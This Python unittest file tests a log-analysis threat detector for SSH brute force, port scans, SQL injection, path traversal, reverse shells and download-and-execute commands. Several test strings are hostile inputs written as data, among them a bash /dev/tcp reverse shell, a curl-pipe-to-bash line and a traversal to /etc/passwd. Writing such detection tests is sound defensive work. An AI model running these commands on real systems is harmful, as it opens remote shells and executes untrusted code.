import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import detector  # noqa: E402


def ids(text):
    return {f["id"] for f in detector.analyze(text)["findings"]}


class DetectorTests(unittest.TestCase):
    def test_ssh_bruteforce_then_success_is_critical(self):
        log = "\n".join(f"sshd[1]: Failed password for root from 203.0.113.9 port {i} ssh2" for i in range(6))
        log += "\nsshd[2]: Accepted password for root from 203.0.113.9 port 99 ssh2"
        found = ids(log)
        self.assertIn("ssh_bruteforce", found)
        self.assertIn("bruteforce_success", found)

    def test_few_failures_are_not_bruteforce(self):
        log = "sshd[1]: Failed password for bob from 203.0.113.9 port 1 ssh2"
        self.assertNotIn("ssh_bruteforce", ids(log))

    def test_url_encoded_web_attacks(self):
        log = ('1.2.3.4 - - [18/Oct/2026:10:00:00 +0000] "GET /a?id=1%20UNION%20SELECT%20pw HTTP/1.1" 200 1 "-" "x"\n'
               '1.2.3.4 - - [18/Oct/2026:10:00:01 +0000] "GET /d?f=..%2f..%2fetc%2fpasswd HTTP/1.1" 200 1 "-" "x"')
        self.assertTrue({"web_sqli", "web_traversal"} <= ids(log))

    def test_reverse_shell_and_download_exec(self):
        self.assertIn("reverse_shell", ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        self.assertIn("download_exec", ids("curl -s http://x/y.sh | bash"))

    def test_port_scan(self):
        log = "\n".join(f"[UFW BLOCK] SRC=198.51.100.1 DST=10.0.0.1 PROTO=TCP DPT={p}" for p in range(20, 35))
        self.assertIn("port_scan", ids(log))

    def test_benign_admin_activity_is_clean(self):
        log = ("sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash\n"
               "sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l\n"
               "sshd[1]: Accepted publickey for deploy from 192.168.1.20 port 5 ssh2")
        result = detector.analyze(log)
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["risk_level"], "clean")

    def test_samples_all_flag_threats(self):
        for path in (ROOT / "samples").glob("*.log"):
            result = detector.analyze(path.read_text())
            self.assertTrue(result["findings"], path.name)

    def test_ai_context_is_compact(self):
        text = (ROOT / "samples" / "access.log").read_text() * 200
        ctx = detector.ai_context(detector.analyze(text))
        self.assertLess(len(ctx), 6000)


if __name__ == "__main__":
    unittest.main()
